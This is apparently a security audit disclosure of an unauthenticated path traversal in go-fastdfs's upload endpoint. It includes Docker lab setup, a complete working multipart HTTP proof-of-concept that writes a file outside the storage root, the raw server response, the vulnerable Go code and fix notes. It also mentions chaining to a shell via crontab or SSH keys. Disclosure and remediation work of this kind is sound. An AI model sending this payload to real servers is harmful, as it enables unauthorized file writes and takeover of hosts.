### Vulnerability details

**Official website / Product:** https://github.com/sjqzhang/go-fastdfs

**Repository:** sjqzhang/go-fastdfs (stars at selection: 4140)

**Vulnerability type:** file_upload (path traversal → arbitrary file write / getshell chain)

**Vulnerability versions:** master `7fc193140a5a921db057be1f7b01b5148e10b87f` (2026-07-11 tip). Default `rename_file=false` (if true, `http_upload.go:412` overwrites ReName with MD5+ext and this vector dies). `enable_trim_file_name_special_char=true` only cleans multipart-header `Name`, not form field `filename`→ReName. Defaults: `auth_url=""` (unauthenticated upload), `scenes=[]`, `enable_custom_path=true`, `group=group1`.

**Vulnerability URL / Parameter:** `POST /group1/upload` form field `filename` (stored as `FileInfo.ReName`); same request also needs multipart field `file` (body) and optional `scene`/`output`.

**Complex:** yes

### Verification procedure

1. **Rebuild the lab** (original `labs/gofastdfs-r34-a4/` and image `gofastdfs-r34-a4:local` were removed after audit). Build from source and start as follows:

```bash
# from campaign root
cd repos/go-fastdfs
git checkout 7fc193140a5a921db057be1f7b01b5148e10b87f
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o /tmp/gofastdfs-fileserver .

mkdir -p /tmp/gofastdfs-r34-a4-build
cp /tmp/gofastdfs-fileserver /tmp/gofastdfs-r34-a4-build/fileserver
```

Write the following `Dockerfile` and `docker-compose.yml` into `/tmp/gofastdfs-r34-a4-build/`:

```dockerfile
FROM alpine:3.20
RUN mkdir -p /usr/local/go-fastdfs/data/conf \
    /usr/local/go-fastdfs/data/data \
    /usr/local/go-fastdfs/data/files \
    /usr/local/go-fastdfs/data/log
COPY fileserver /usr/local/go-fastdfs/fileserver
RUN chmod +x /usr/local/go-fastdfs/fileserver
WORKDIR /usr/local/go-fastdfs
ENV GO_FASTDFS_DIR=/usr/local/go-fastdfs/data
EXPOSE 8080
CMD ["./fileserver", "server"]
```

```yaml
# Host 21404 → container 8080
services:
  gofastdfs:
    build: .
    image: gofastdfs-r34-a4:local
    container_name: gofastdfs-r34-a4
    ports:
      - "21404:8080"
    environment:
      GO_FASTDFS_DIR: /usr/local/go-fastdfs/data
    volumes:
      - gofastdfs_data:/usr/local/go-fastdfs/data

volumes:
  gofastdfs_data:
```

```bash
cd /tmp/gofastdfs-r34-a4-build
docker compose up -d --build
# wait until http://127.0.0.1:21404/ responds
```

Lab facts: `GO_FASTDFS_DIR=/usr/local/go-fastdfs/data`, storage root `STORE_DIR=.../data/files`; host port **21404** → container **8080**; container name `gofastdfs-r34-a4`. Do not use the older official Hub image (~v1.4.5); it is not the audited tree.

2. Confirm defaults: `rename_file=false`, `auth_url=""` (**no credentials**).
3. Send the PoC below with `scene=default` and form field `filename=../../../../../../../../../../tmp/r34a4-verified-filename.txt` (multipart header filename may be benign `safe.txt`); body `R34A4-FILENAME-PWN-1793584430`.
4. Expect HTTP 200, `status=ok`, and response `path`/`src` containing `../` sequences targeting `/tmp/r34a4-verified-filename.txt`.
5. Confirm the write inside the container:
   ```bash
   docker exec gofastdfs-r34-a4 ls -la /tmp/r34a4-verified-filename.txt
   docker exec gofastdfs-r34-a4 cat /tmp/r34a4-verified-filename.txt
   ```
   Expected output:
   ```
   -rw-r--r--    1 root     root            30 Nov  2 01:53 /tmp/r34a4-verified-filename.txt
   R34A4-FILENAME-PWN-1793584430
   ```
6. Control: multipart header `filename=` is basename-only via `filepath.Split` and may be trimmed by `TrimFileNameSpecialChar`; form field `filename`→ReName is **not**.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /group1/upload HTTP/1.1
Host: 127.0.0.1:21404
User-Agent: r34-a4-gofastdfs-audit
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr34a4Scene01
Content-Length: 559

------WebKitFormBoundaryr34a4Scene01
Content-Disposition: form-data; name="output"

json2
------WebKitFormBoundaryr34a4Scene01
Content-Disposition: form-data; name="scene"

default
------WebKitFormBoundaryr34a4Scene01
Content-Disposition: form-data; name="filename"

../../../../../../../../../../tmp/r34a4-verified-filename.txt
------WebKitFormBoundaryr34a4Scene01
Content-Disposition: form-data; name="file"; filename="safe.txt"
Content-Type: application/octet-stream

R34A4-FILENAME-PWN-1793584430

------WebKitFormBoundaryr34a4Scene01--
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Authorization, Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, X-Requested-By, If-Modified-Since, X-File-Name, X-File-Type, Cache-Control, Origin
Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE
Access-Control-Allow-Origin: *
Access-Control-Expose-Headers: Authorization
Date: Mon, 02 Nov 2026 01:53:50 GMT
Content-Length: 646
Content-Type: text/plain; charset=utf-8
Connection: close

{
  "data": {
    "domain": "http://127.0.0.1:21404",
    "md5": "78f44cab51c88ef31117400b4f860f99",
    "mtime": 1793584430,
    "path": "/group1/default/20261102/01/53/5/../../../../../../../../../../tmp/r34a4-verified-filename.txt",
    "retcode": 0,
    "retmsg": "",
    "scene": "default",
    "scenes": "default",
    "size": 30,
    "src": "/group1/default/20261102/01/53/5/../../../../../../../../../../tmp/r34a4-verified-filename.txt",
    "url": "http://127.0.0.1:21404/group1/default/20261102/01/53/5/../../../../../../../../../../tmp/r34a4-verified-filename.txt?name=safe.txt\u0026download=1"
  },
  "message": "",
  "status": "ok"
}
```

Verification result notes:

- HTTP 200, `status=ok`; response path contains `../` sequences targeting `/tmp/r34a4-verified-filename.txt`.
- Container file contents: `R34A4-FILENAME-PWN-1793584430` (upload body 30 bytes including trailing newline).
- Control: multipart header filename is basename-only via `filepath.Split`; form field `filename`→ReName is not.
- Further chain: write crontab / ssh `authorized_keys` / overwrite app config for getshell (depends on process user and host).

### Vulnerability analysis

Upload maps form `filename` to `fileInfo.ReName` (`http_upload.go:218,252`). `SaveUploadFile` sanitizes only the multipart header name (`filepath.Split` + optional `TrimFileNameSpecialChar` at 402-407). When `ReName != ""` it sets `outPath = folder + "/" + ReName` with no Clean/Base and no `../` rejection. With default `rename_file=false`, an unauthenticated client writes arbitrary paths relative to the dated folder outside `STORE_DIR`. If `rename_file=true`, line 412 overwrites ReName with MD5 and this vector dies. This is independent of the CVE-2023-1800 `path` strip and of Name trimming (also independent of the sibling `scene` traversal in VULN-0062).

Trigger / sink source (full path and line numbers):

```go
# File: repos/go-fastdfs/server/http_upload.go
# Lines: 218,252 (ReName assign); 402-407 (Name-only trim); 412 (RenameFile MD5 overwrite); 436-450 (ReName outPath + Create)
fileName = r.FormValue("filename")
fileInfo.ReName = fileName

_, fileInfo.Name = filepath.Split(header.Filename)
if Config().EnableTrimFileNameSpecialChar {
	fileInfo.Name = c.TrimFileNameSpecialChar(fileInfo.Name)
}
if Config().RenameFile {
	fileInfo.ReName = c.util.MD5(c.util.GetUUID()) + path.Ext(fileInfo.Name)
}

outPath := fmt.Sprintf(folder+"/%s", fileInfo.Name)
if fileInfo.ReName != "" {
	outPath = fmt.Sprintf(folder+"/%s", fileInfo.ReName)
}
outFile, err = os.Create(outPath)
```

### Fix notes

1. Apply the same trim/`filepath.Base` rules to ReName; reject `..`.
2. Before Create, Clean outPath and require it stays under STORE_DIR.
3. Or force `rename_file=true` and ignore client-provided filename as a path; set `auth_url` in production.
